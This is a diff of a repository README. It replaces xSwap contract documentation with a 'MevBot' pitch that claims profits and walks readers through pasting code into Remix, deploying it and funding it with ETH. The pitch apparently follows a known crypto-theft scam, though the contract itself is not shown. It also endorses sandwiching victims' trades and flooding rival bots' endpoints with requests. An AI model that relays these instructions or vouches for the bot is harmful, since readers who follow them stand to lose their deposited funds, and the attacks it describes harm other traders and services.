@@ -1,119 +1,103 @@
-
-# xSwap
-
-## To check on the maximum amount available for swap in one transaction:
-
-- **1). Call contract function `getLiquidity(tokenAddress)`:**
-    Get the real-time balance of a particular asset
-
-- **2). Call contract function `getAmountByOutput(inputAsset, outputAsset, outputAmount)`:**
-    Get the real-time balance of the `inputAsset` by providing `outputAmount ` of the `outputAsset`
-
-**eg:** To check on the maximum amount available of each asset for swap in respond to the trading request of “USDC-USDT”.
-First, get the real-time balance of `USDT` by calling the function `getLiquidity(USDT_Address)`, for instance, let’s assume there are `10000` USDT sitting in the balance. Secondly, call the function `getAmountByOutput(USDC_Address, USDT_Address, 10000)` to get the real-time balance of USDC which is available for instant swap.
-
-## Mainnet Contract Address(2020-05-26)
-
-<table>
-	<tr>
-   		<th>Contract Name</th>
-    	<th>Contract Address</th>
-	</tr>
-	<tr>
-		<td> xSwap Proxy </td>
-		<td> 0x03eF3f37856bD08eb47E2dE7ABc4Ddd2c19B60F2 </td>
-	</tr>
-	<tr>
-		<td> BUSD </td>
-		<td> 0x4Fabb145d64652a948d72533023f6E7A623C7C53  </td>
-	</tr>
-	<tr>
-		<td> DAI </td>
-		<td> 0x6B175474E89094C44Da98b954EedeAC495271d0F </td>
-	</tr>
-	<tr>
-		<td> HUSD </td>
-		<td> 0xdF574c24545E5FfEcb9a659c229253D4111d87e1 </td>
-	</tr>
-	<tr>
-		<td> PAX </td>
-		<td> 0x8E870D67F660D95d5be530380D0eC0bd388289E1 </td>
-	</tr>
-	<tr>
-		<td> TUSD </td>
-		<td> 0x0000000000085d4780B73119b644AE5ecd22b376 </td>
-	</tr>
-	<tr>
-		<td> USDC </td>
-		<td> 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 </td>
-	</tr>
-	<tr>
-		<td> USDT </td>
-		<td> 0xdAC17F958D2ee523a2206206994597C13D831ec7 </td>
-	</tr>
-	<tr>
-		<td> USDx </td>
-		<td> 0xeb269732ab75A6fD61Ea60b06fE994cD32a83549 </td>
-	</tr>
-	<tr>
-		<td> DSGuard </td>
-		<td> 0x9121D140fff2660f72f1fbeD92e7f66A11014d6C </td>
-	</tr>
-</table>
-
-## Rinkeby Contract Address(2020-05-10)
-
-<table>
-	<tr>
-   		<th>Contract Name</th>
-    	<th>Contract Address</th>
-	</tr>
-	<tr>
-		<td> xSwap Proxy </td>
-		<td> 0x076CCd4c0025B0E89a1D6b6B33B781A0795Dc3c5 </td>
-	</tr>
-	<tr>
-		<td> BUSD </td>
-		<td> 0xBB4EeFbE28440D27D18e4269962bE2506366c476  </td>
-	</tr>
-	<tr>
-		<td> DAI </td>
-		<td> 0xA3A59273494BB5B8F0a8FAcf21B3f666A47d6140 </td>
-	</tr>
-	<tr>
-		<td> HUSD </td>
-		<td> 0x0D518472330FF1D943881BBBDda03b221A7F9F74 </td>
-	</tr>
-	<tr>
-		<td> PAX </td>
-		<td> 0x722E6238335d89393A42e2cA316A5fb1b8B2EB55 </td>
-	</tr>
-	<tr>
-		<td> TUSD </td>
-		<td> 0xe72a3181f69Eb21A19bd4Ce19Eb68FDb333d74c6 </td>
-	</tr>
-	<tr>
-		<td> USDC </td>
-		<td> 0x4DBCdF9B62e891a7cec5A2568C3F4FAF9E8Abe2b </td>
-	</tr>
-	<tr>
-		<td> USDT </td>
-		<td> 0xaa74B62f737bbA1D2E520F9ec38Fc23b6E6817df </td>
-	</tr>
-	<tr>
-		<td> USDx </td>
-		<td> 0xD96cC7f80C1cb595eBcdC072531e1799B3a2436E </td>
-	</tr>
-	<tr>
-		<td> DSGuard </td>
-		<td> 0x694D5D8DeDFeaff6498e5A8763e0748C85cfeFC7 </td>
-	</tr>
-</table>
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
 
-### Run test
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-```
-npm install
-truffle test
-```
+## For demonstration purposes, other wallets will be used for testing below.
+
+
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
+
+## Update 08.05.2023 (Result)
+
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
+
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
+
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
+
+The bot sends transactions and monitors the Uniswap v2 Mempool.
+
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
+
+Finally, the ETH is returned to the contract for withdrawal.
+
+This bot performs all of these functions faster than 99% of other bots.
+
+*But ser, there are open source bots that do the same*
+
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
+
+*Wen increase aggressiveness ?*
+
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
+
+*What did I learn?*
+
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
+
+*So why stop?*
+
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
+
+
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
+
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
+
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
+
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
+
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
+
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
+
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
+
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
+
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
+
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
+
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
+
+
+
+
+
+
+
+
+
